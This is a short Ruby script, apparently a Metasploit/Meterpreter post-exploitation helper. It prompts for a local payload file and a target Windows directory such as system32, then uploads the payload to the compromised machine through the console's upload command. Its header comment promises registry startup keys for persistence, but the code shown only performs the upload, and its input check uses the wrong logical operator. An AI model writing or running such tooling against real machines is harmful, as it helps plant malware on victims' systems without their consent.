#Load our own payload to a directory and create keys in Windows Registery for startup.
#gcrackem emailchase@gmail.com

puts "Enter the location of your payload [example:] /root/payload.exe"
payload = gets.chomp
puts "Enter the directory to upload our payload on the windows machine [example:] c:\\windows\\system32"
dir = gets.chomp

if payload != nil || dir != nil
	puts "Uploading payload from #{payload} to Windows folder #{dir}"
	console.run_single("upload #{payload} #{dir}")
	#write=REX::console.write(testing)
	#return write
else
	puts "Error: Need both payload location and target directory"
end
